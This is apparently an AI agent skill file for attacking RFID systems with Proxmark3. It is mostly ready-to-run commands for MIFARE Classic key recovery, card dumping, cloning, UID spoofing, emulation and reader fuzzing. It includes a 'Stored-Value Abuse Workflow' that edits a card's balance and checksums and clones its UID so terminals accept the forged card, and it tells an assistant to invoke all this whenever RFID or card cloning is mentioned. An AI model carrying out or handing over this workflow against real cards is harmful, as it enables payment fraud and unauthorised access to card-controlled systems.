---
name: proxmark3-rfid
description: Use Proxmark3 to attack RFID systems, dump MIFARE Classic cards, clone tags, and exploit stored-value systems. Use this skill whenever the user mentions RFID, NFC, Proxmark3, MIFARE Classic, card cloning, key recovery, RFID security testing, or any RFID-related penetration testing task.
---

# Proxmark3 RFID Attack Skill

This skill helps you use Proxmark3 hardware to attack RFID systems, particularly MIFARE Classic cards.

## Quick Start

1. Ensure Proxmark3 hardware is connected and software is installed
2. Connect to the device and run commands
3. Use the appropriate attack method based on your target

## MIFARE Classic 1KB Structure

MIFARE Classic 1KB cards have:
- **16 sectors**, each with **4 blocks**
- **16 bytes per block**
- **UID** stored in sector 0 block 0 (cannot be altered)
- **2 keys (A and B)** stored in block 3 of each sector (sector trailer)
- **Access bits** in sector trailer control read/write permissions for each block

The two-key design allows different permissions: one key for read access, another for write access.

## Key Recovery Attacks

Use these commands to recover sector keys:

```bash
# List available MIFARE attacks
hf mf

# Brute force keys with dictionary
hf mf chk *1 ? t ./client/default_keys.dic

# Improved brute force
hf mf fchk 1 t

# Read block with known key
hf mf rdbl 0 A FFFFFFFFFFFF

# Read entire sector with known key
hf mf rdsc 0 A FFFFFFFFFFFF
```

## Card Operations

```bash
# Dump card (uses keys from dumpkeys.bin)
hf mf dump 1

# Restore data to new card
hf mf restore

# Load and simulate dump
hf mf eload hf-mf-B46F6F79-data

# Simulate card from memory
hf mf sim *1 u 8c61b5b4
```

## Read/Write Operations

```bash
# Read block
hf mf eget 01

# Write block to card
hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f

# Set block (simulation mode)
hf mf eset 01 000102030405060708090a0b0c0d0e0f
```

## Stored-Value Abuse Workflow

When terminals store balances on Classic cards, follow this workflow:

```bash
# 1. Recover sector keys and dump full card
hf mf autopwn

# 2. Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3. Write modified dump to UID-changeable tag
hf mf cload -f modified.bin

# 4. Clone original UID so readers recognize the card
hf mf csetuid -u <original_uid>
```

**Important notes:**
- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder
- Writing block 0/UID only works on "Chinese magic" gen1a/gen2 cards. Normal Classic cards have read-only UID
- Many deployments use Classic "value blocks" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing

## Raw Commands for Non-Standard Tags

IoT systems sometimes use nonbranded or noncommercial tags. Use Proxmark3 to send custom raw commands:

```bash
# Search and identify tag
hf search

# Example output:
# UID : 80 55 4b 6c
# ATQA : 00 04
# SAK : 08 [2]
# TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
# proprietary non iso14443-4 card found, RATS not supported
# No chinese magic backdoor command detected
# Prng detection: WEAK

# Send raw command
hf 14a raw -p -b 7 26
```

With this information, research the card type and communication protocol, then craft appropriate raw commands.

## Automation Scripts

Proxmark3 includes preloaded automation scripts:

```bash
# List available scripts
script list

# Run a script
script run mfkeys
```

You can create custom Lua scripts to fuzz tag readers by randomizing bytes and checking if the reader crashes with any iteration.

## Eavesdropping

Proxmark3 can sniff Tag-to-Reader communication to find sensitive data. With weak cryptographic operations, knowing the plain and cipher text allows you to calculate the key using the `mfkey64` tool.

## References

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
